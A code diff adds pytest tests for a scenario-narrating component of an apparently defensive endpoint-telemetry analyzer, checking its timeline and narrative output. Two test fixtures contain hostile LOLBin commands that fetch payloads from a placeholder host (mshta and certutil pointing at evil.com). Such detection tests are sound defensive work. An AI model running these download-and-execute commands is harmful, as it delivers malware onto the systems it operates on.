@@ -443,6 +443,58 @@ class TestVerdictEngineProvenance:
 # End-to-end smoke test — full analyze() pipeline on a real sample CSV
 # ─────────────────────────────────────────────────────────────────────────
 
+class TestScenarioNarrator:
+    """ScenarioNarrator must build its narrative/timeline purely from raw
+    telemetry (process/network/files/registry/tasks/scripts/cmdlines/LSASS)
+    and never consult BehaviorAnalyzer/S1's own indicators — see
+    project memory on evidentiary independence."""
+
+    def _narrator_for(self, events):
+        proc = s1.ProcessAnalyzer(events)
+        net = s1.NetworkAnalyzer(events)
+        files = s1.FileAnalyzer(events)
+        reg = s1.RegistryAnalyzer(events)
+        tasks = s1.TaskAnalyzer(events)
+        scripts = s1.ScriptAnalyzer(events)
+        cmdline_an = s1.CmdlineAnalyzer(events)
+        lsass = s1.LsassAnalyzer(events)
+        return s1.ScenarioNarrator(proc, net, files, reg, tasks, scripts, cmdline_an, lsass)
+
+    def test_empty_events_produce_empty_timeline_and_fallback_narrative(self):
+        narrator = self._narrator_for([])
+        assert narrator.build_timeline() == []
+        assert "No independent scenario" in narrator.build_narrative()
+
+    def test_lolbin_cmdline_produces_script_payload_phase(self):
+        events = [_mkev('mshta.exe http://evil.com/payload.hta')]
+        narrator = self._narrator_for(events)
+        timeline = narrator.build_timeline()
+        phases = {p["phase"] for p in timeline}
+        assert "Script & Payload Activity" in phases
+
+    def test_real_sample_produces_valid_structure(self):
+        assert SAMPLE_CSV.exists(), "sample fixture missing"
+        events = s1.CsvParser.parse_file(str(SAMPLE_CSV))
+        narrator = self._narrator_for(events)
+        timeline = narrator.build_timeline()
+        for phase in timeline:
+            assert phase["phase"] in s1.ScenarioNarrator.PHASE_ORDER
+            assert phase["fact_count"] == len(phase["facts"])
+            for f in phase["facts"]:
+                assert isinstance(f["fact"], str) and f["fact"]
+        narrative = narrator.build_narrative()
+        assert isinstance(narrative, str) and narrative
+
+    def test_narrative_never_mentions_s1_only_when_raw_evidence_exists(self):
+        # If raw telemetry yields at least one phase, the narrative must be
+        # built from it, not the "no scenario" fallback.
+        events = [_mkev("certutil.exe -urlcache -split -f http://evil.com/p.exe out.exe")]
+        narrator = self._narrator_for(events)
+        narrative = narrator.build_narrative()
+        assert "No independent scenario" not in narrative
+        assert "certutil" in narrative.lower()
+
+
 class TestAnalyzeEndToEnd:
     def test_full_pipeline_produces_valid_report(self):
         assert SAMPLE_CSV.exists(), "sample fixture missing"
@@ -451,8 +503,13 @@ class TestAnalyzeEndToEnd:
         # Structural invariants
         for section in ("meta", "identification", "data_quality", "verdict",
                          "metrics", "behavioral_indicators", "mitre_attack",
-                         "sigma_matches", "ioc_extraction", "kill_chain"):
+                         "sigma_matches", "ioc_extraction", "kill_chain",
+                         "scenario_reconstruction"):
             assert section in data, f"missing JSON section: {section}"
+
+        sr = data["scenario_reconstruction"]
+        assert isinstance(sr["narrative"], str) and sr["narrative"]
+        assert isinstance(sr["timeline"], list)
 
         v = data["verdict"]
         score = v["score"]
